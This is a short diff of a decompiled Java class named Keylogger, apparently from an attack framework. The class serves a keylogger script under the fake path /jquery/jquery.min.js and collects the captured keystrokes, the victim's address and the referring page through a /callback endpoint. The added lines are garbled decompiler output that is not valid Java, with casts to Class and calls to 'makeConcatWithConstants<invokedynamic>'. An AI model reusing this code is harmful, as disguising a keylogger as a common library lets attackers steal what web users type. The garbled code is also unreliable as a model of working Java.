@@ -54,13 +54,14 @@ public class Keylogger implements WebService {
 
    public Response serve(String uri, String method, Properties header, Properties param) {
       if (uri.equals("/jquery/jquery.min.js")) {
-         return new Response("200 OK", "text/javascript", this.resource("/resources/keylogger.js", this.proto + header.get("Host") + "/callback"));
+         String var10006 = this.proto;
+         return new Response("200 OK", "text/javascript", this.resource("/resources/keylogger.js", var10006 + header.get("Host") + "/callback"));
       } else if (!uri.equals("/callback")) {
-         return new Response("200 OK", this.type, this.content.replace("%TOKEN%", param.get("id") + ""));
+         return new Response("200 OK", this.type, this.content.replace("%TOKEN%", ((Class)param.get("id")).makeConcatWithConstants<invokedynamic>(param.get("id"))));
       } else {
          Iterator i = this.listeners.iterator();
-         String who = header.get("REMOTE_ADDRESS") + "";
-         String from = header.get("Referer") + "";
+         String who = ((Class)header.get("REMOTE_ADDRESS")).makeConcatWithConstants<invokedynamic>(header.get("REMOTE_ADDRESS"));
+         String from = ((Class)header.get("Referer")).makeConcatWithConstants<invokedynamic>(header.get("Referer"));
          if (who.length() > 1) {
             who = who.substring(1);
          }
@@ -70,7 +71,7 @@ public class Keylogger implements WebService {
          while(i.hasNext()) {
             try {
                l = (Keylogger.KeyloggerListener)i.next();
-               l.slowlyStrokeMe(from, who, param, param.get("id") + "");
+               l.slowlyStrokeMe(from, who, param, ((Class)param.get("id")).makeConcatWithConstants<invokedynamic>(param.get("id")));
             } catch (Exception var10) {
                WebServer.logException("Listener: " + l + " vs. " + from + ", " + who + ", " + param, var10, false);
             }
